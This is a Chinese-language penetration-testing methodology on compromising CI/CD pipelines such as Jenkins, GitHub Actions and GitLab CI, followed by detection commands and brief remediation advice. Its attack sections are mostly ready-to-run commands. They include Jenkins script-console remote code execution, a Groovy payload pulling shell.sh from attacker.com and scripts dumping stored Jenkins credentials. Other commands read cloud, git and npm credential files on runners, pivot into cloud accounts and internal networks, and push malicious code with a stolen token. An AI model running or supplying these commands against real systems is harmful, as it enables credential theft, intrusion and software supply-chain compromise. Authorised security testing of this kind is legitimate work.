# CI/CD 管道入侵方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的 CI/CD 管道安全检测和利用流程。

## 1.2 适用范围

本文档适用于使用 CI/CD 系统（Jenkins、GitHub Actions、GitLab CI 等）的组织。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

CI/CD 管道入侵是指攻击者通过利用 CI/CD 系统的配置缺陷或漏洞，获取构建系统访问权限，进而植入恶意代码、窃取凭证或破坏软件供应链。

**常见攻击面**：
- 未认证的 Jenkins 实例
- 过宽的 GitHub Actions 权限
- 泄露的 CI/CD 凭证
- 不安全的构建脚本

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-732 | 危险资源权限分配 |
| CWE-798 | 使用硬编码凭证 |
| CWE-829 | 从不可信控制域包含功能 |

---

## 专题二：OWASP Top 10 CI/CD 安全风险完整攻击向量

### 2.6 CI/CD 十大安全风险详解

#### 2.6.1 CI-1: 未保护的调试机制

**风险描述**：CI/CD 系统暴露的调试接口可被攻击者利用获取系统访问权限。

**攻击向量**：
```bash
# Jenkins 脚本控制台未保护
curl http://jenkins.target.com/script
curl -X POST http://jenkins.target.com/scriptText \
  -d "script=println 'whoami'.execute().text"

# Jenkins CLI 未认证
java -jar jenkins-cli.jar -s http://jenkins.target.com/ help

# GitLab Rails 控制台暴露
curl http://gitlab.target.com/-/rails/info/properties
```

**检测方法**：
```bash
# 扫描 Jenkins 实例
nmap --script http-jenkins -p 8080,8081,8443 target.com

# 检查脚本控制台
curl -I http://target.com/script

# 检查 CLI 端口
nmap -p 50000 target.com
```

#### 2.6.2 CI-2: 不安全的继承配置

**风险描述**：子项目或子作业继承父项目的不安全配置，导致权限提升。

**攻击向量**：
```yaml
# GitHub Actions 工作流继承
# .github/workflows/inherit.yml
name: Inherited Workflow
on: push
jobs:
  build:
    uses: ./.github/workflows/base.yml
    # 可能继承过宽的权限
```

**检测方法**：
```bash
# 检查工作流继承链
find .github/workflows -name "*.yml" -exec grep -l "uses:" {} \;

# 分析权限继承
# 检查每个工作流的 permissions 配置
```

#### 2.6.3 CI-3: 不安全的自托管 Runner

**风险描述**：自托管 Runner 配置不当可能导致凭证泄露或代码执行。

**攻击向量**：
```bash
# Runner 未隔离，可访问内网
# 攻击者通过 PR 触发工作流，Runner 执行恶意代码

# 窃取 Runner 上的凭证
cat ~/.git-credentials
cat ~/.aws/credentials
cat ~/.npmrc

# 访问内网资源
curl http://internal-jenkins.internal/
curl http://internal-artifactory.internal/
```

**检测方法**：
```bash
# 检查 Runner 配置
cat .runner/.credentials
cat .runner/.settings

# 检查 Runner 网络访问
# Runner 是否能访问内网资源
```

#### 2.6.4 CI-4: 不安全的第三方服务集成

**风险描述**：与第三方服务的集成可能泄露凭证或引入恶意代码。

**攻击向量**：
```yaml
# 使用第三方 Action
- uses: third-party/action@v1
# 可能包含恶意代码

# 第三方服务有漏洞
# 集成时泄露凭证
```

**检测方法**：
```bash
# 审计第三方 Action
# 检查 Action 源码
curl https://github.com/third-party/action

# 检查 Action 权限
# 是否请求不必要的权限
```

#### 2.6.5 CI-5: 不安全的凭证存储

**风险描述**：凭证以明文或不安全方式存储，可被窃取。

**攻击向量**：
```bash
# 环境变量泄露
printenv | grep -i secret
printenv | grep -i token
printenv | grep -i key

# 日志中泄露凭证
# 某些命令可能将凭证输出到日志
echo $SECRET_KEY

# 文件形式存储凭证
cat .env
cat secrets.json
```

**检测方法**：
```bash
# 扫描代码仓库中的凭证
trufflehog git https://github.com/target/repo
gitleaks detect --source https://github.com/target/repo

# 检查工作流中的凭证使用
grep -r "secrets\." .github/workflows/
```

#### 2.6.6 CI-6: 不安全的 Webhook 实现

**风险描述**：Webhook 配置不当可能导致未授权触发或信息泄露。

**攻击向量**：
```bash
# 伪造 Webhook 请求
curl -X POST https://ci-server.com/webhook \
  -H "Content-Type: application/json" \
  -H "X-GitHub-Event: push" \
  -d '{"ref": "refs/heads/main"}'

# Webhook 泄露敏感信息
# Webhook payload 可能包含凭证
```

**检测方法**：
```bash
# 检查 Webhook 配置
curl -H "Authorization: token TOKEN" \
  https://api.github.com/repos/org/repo/hooks

# 检查 Webhook Secret
# 是否配置了签名验证
```

#### 2.6.7 CI-7: 不安全的构建代理

**风险描述**：构建代理配置不当可能导致凭证泄露或代码执行。

**攻击向量**：
```bash
# 代理未认证
telnet build-agent.target.com 50000

# 代理可访问主节点
# 通过代理攻击主节点

# 代理共享文件系统
# 通过共享目录植入恶意代码
```

**检测方法**：
```bash
# 扫描代理端口
nmap -p 50000,8080,8443 target.com

# 检查代理认证配置
```

#### 2.6.8 CI-8: 不安全的部署机制

**风险描述**：部署流程不安全可能导致未授权部署或凭证泄露。

**攻击向量**：
```yaml
# 部署凭证硬编码
- name: Deploy
  run: |
    curl -X POST https://prod-server.com/deploy \
      -H "Authorization: Bearer HARDCODED_TOKEN"

# 部署脚本可被篡改
# 部署目标未验证
```

**检测方法**：
```bash
# 检查部署脚本
cat deploy.sh
cat .github/workflows/deploy.yml

# 检查部署凭证
# 是否使用秘密管理系统
```

#### 2.6.9 CI-9: 不安全的日志处理

**风险描述**：日志处理不当可能导致敏感信息泄露或日志注入。

**攻击向量**：
```bash
# 日志中包含敏感信息
# 构建日志可能泄露凭证
curl https://ci.target.com/builds/123/log

# 日志注入攻击
# 通过日志注入恶意内容
echo -e "\033[31mMalicious\033[0m"

# 日志存储不安全
# 日志可能被未授权访问
```

**检测方法**：
```bash
# 检查日志访问控制
curl https://ci.target.com/builds/123/log

# 检查日志内容
# 是否包含敏感信息
```

#### 2.6.10 CI-10: 不安全的更新机制

**风险描述**：CI/CD 系统更新机制不安全可能导致恶意更新。

**攻击向量**：
```bash
# 更新未验证签名
# 更新来源未验证

# 更新过程被劫持
# 中间人攻击替换更新包
```

**检测方法**：
```bash
# 检查更新配置
# 是否验证签名
# 是否使用 HTTPS
```

### 2.7 GitHub Actions 特定攻击向量

#### 2.7.1 pull_request_target 滥用

```yaml
# 危险配置：pull_request_target
name: PR Build
on:
  pull_request_target:  # 在基础分支上下文中运行
    types: [opened, synchronize]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # 检出 PR 代码
      # 攻击者可以在 PR 中植入恶意代码
      # 但工作流有访问 secrets 的权限
      - name: Build
        run: npm install && npm build
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
```

**检测方法**：
```bash
# 搜索 pull_request_target
grep -r "pull_request_target" .github/workflows/

# 检查是否检出 PR 代码
grep -A 10 "pull_request_target" .github/workflows/*.yml | grep "ref:"
```

#### 2.7.2 工作流注入攻击

```yaml
# 攻击者通过 PR 注入工作流
name: Test
on:
  issue_comment:
    types: [created]

jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      # 危险：执行评论中的命令
      - name: Run Command
        run: ${{ github.event.comment.body }}
```

#### 2.7.3 依赖混淆通过 Actions

```yaml
# 在 Actions 中安装依赖
- name: Install Dependencies
  run: npm install

# 如果 package.json 被篡改
# 可能安装恶意依赖
```

### 2.8 Jenkins 特定攻击向量

#### 2.8.1 Jenkins 远程代码执行

```bash
# 脚本控制台 RCE
curl -X POST http://jenkins.target.com/scriptText \
  -d "script=println 'whoami'.execute().text"

# 使用 Groovy 执行命令
curl -X POST http://jenkins.target.com/scriptText \
  -d "script='whoami'.execute().text.eachLine{line -> println line}"

# 下载文件
curl -X POST http://jenkins.target.com/scriptText \
  -d "script=new URL('http://attacker.com/shell.sh').openStream().with{it.newReader().withReader{r->r.eachLine{line->println line}}}"
```

#### 2.8.2 Jenkins 凭证窃取

```bash
# 窃取 Jenkins 凭证
curl -X POST http://jenkins.target.com/scriptText \
  -d "script=com.cloudbees.plugins.credentials.SystemCredentialsProvider.getInstance().getCredentials().each{println it}"

# 访问凭证存储
curl -X POST http://jenkins.target.com/scriptText \
  -d "script=Jenkins.getInstance().getDescriptor('com.cloudbees.plugins.credentials.SystemCredentialsProvider').getCredentials().each{println it}"
```

#### 2.8.3 Jenkins 插件漏洞利用

```bash
# 检查已安装插件
curl http://jenkins.target.com/pluginManager/api/xml?depth=1

# 查找有漏洞的插件
# 对照 CVE 数据库检查插件版本
```

### 2.9 GitLab CI 特定攻击向量

#### 2.9.1 Runner 令牌泄露

```bash
# Runner 令牌可能泄露在日志或配置中
# 攻击者可以使用令牌注册恶意 Runner

# 检查 Runner 配置
cat /etc/gitlab-runner/config.toml
```

#### 2.9.2 CI/CD 变量泄露

```bash
# 变量可能泄露在作业日志中
echo $CI_JOB_TOKEN

# 变量未保护
# 可在所有分支访问
```

### 2.10 横向移动技术

#### 2.10.1 从 CI/CD 到云资源

```bash
# 窃取云凭证后访问云资源
# AWS
export AWS_ACCESS_KEY_ID=$(echo $AWS_ACCESS_KEY_ID)
export AWS_SECRET_ACCESS_KEY=$(echo $AWS_SECRET_ACCESS_KEY)
aws s3 ls
aws ec2 describe-instances

# GCP
export GOOGLE_APPLICATION_CREDENTIALS=$(echo $GOOGLE_APPLICATION_CREDENTIALS)
gcloud compute instances list

# Azure
az login --service-principal -u $AZURE_CLIENT_ID -p $AZURE_CLIENT_SECRET
az vm list
```

#### 2.10.2 从 CI/CD 到内网

```bash
# 如果 Runner 在内网
# 可以扫描和访问内网资源

# 内网扫描
nmap 10.0.0.0/24

# 访问内网服务
curl http://internal-jenkins.internal/
curl http://internal-artifactory.internal/
curl http://internal-registry.internal/
```

#### 2.10.3 从 CI/CD 到代码仓库

```bash
# 使用窃取的凭证访问代码仓库
git clone https://$GITHUB_TOKEN@github.com/org/private-repo.git

# 推送恶意代码
git add malicious.js
git commit -m "Update"
git push
```

---

# 第三部分：附录

## 3.1 CI/CD 安全测试检查清单

```
□ 检查 Jenkins 认证配置
□ 检查 GitHub Actions 权限
□ 检查凭证存储安全
□ 检查构建脚本完整性
□ 检查依赖来源可信度
□ 检查部署流程安全
□ 检查分支保护配置
```

## 3.2 常用工具

| 工具 | 用途 | 链接 |
|-----|------|------|
| trufflehog | 凭证扫描 | https://github.com/trufflesecurity/trufflehog |
| Jenkins CLI | Jenkins 管理 | Jenkins 内置 |
| Gitleaks | 密钥扫描 | https://github.com/gitleaks/gitleaks |

## 3.3 修复建议

1. **启用认证** - 所有 CI/CD 系统强制认证
2. **最小权限** - 使用最小必要权限
3. **凭证管理** - 使用秘密管理系统
4. **代码审查** - 所有构建脚本变更需审查
5. **审计日志** - 记录所有 CI/CD 操作

---

**参考资源**：
- [OWASP CI/CD Security](https://owasp.org/www-project-devsecops-guideline/)
- [GitHub Actions Security](https://docs.github.com/en/actions/security-guides)
